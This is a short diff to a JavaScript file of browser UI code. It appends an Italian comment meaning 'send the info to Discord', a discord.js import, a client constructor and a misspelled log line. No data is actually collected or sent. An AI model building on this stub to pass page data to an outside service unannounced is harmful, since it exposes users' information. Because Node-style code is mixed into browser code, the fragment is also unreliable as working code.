@@ -208,3 +208,9 @@ function closeEmailSentPopup() {
 }
 
 element.addEventListener('scroll', handleScroll, { passive: true });
+
+// manda su discord le info
+const Discord = require('discord.js');
+const Client = new Discord.Client();
+
+console.log("redy")
